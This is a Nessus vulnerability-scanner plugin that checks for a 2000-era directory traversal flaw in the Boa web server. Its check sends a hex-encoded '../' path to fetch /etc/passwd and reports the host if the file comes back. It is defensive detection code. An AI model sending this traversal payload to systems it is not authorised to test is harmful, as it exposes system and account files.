#
# This script was written by Thomas Reinke <reinke@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title, OSVDB ref, output formatting, family change (9/4/09)


include("compat.inc");

if(description)
{
 script_id(10527);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-2000-0920");
 script_bugtraq_id(1770);
 script_xref(name:"OSVDB", value:"426");
 
 script_name(english:"Boa Web Server Traversal Arbtirary File Access/Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by an information disclosure
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote Boa Webserver allows an attacker to read arbitrary files on
the remote web server by prefixing the pathname of the file with
hex-encoded '../../' characters." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2000-10/0092.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to BowWebserver 0.94.8.3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 script_summary(english:"Boa file retrieval");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2000-2009 Thomas Reinke");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 soc = http_open_socket(port);
 if(soc)
 {
  buf = string("/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd");
  buf = http_get(item:buf, port:port);
  send(socket:soc, data:buf);
  rep = http_recv(socket:soc);
  if(("root:" >< rep) && ("Boa/" >< rep) )
  	security_warning(port);
  http_close_socket(soc);
 }
}
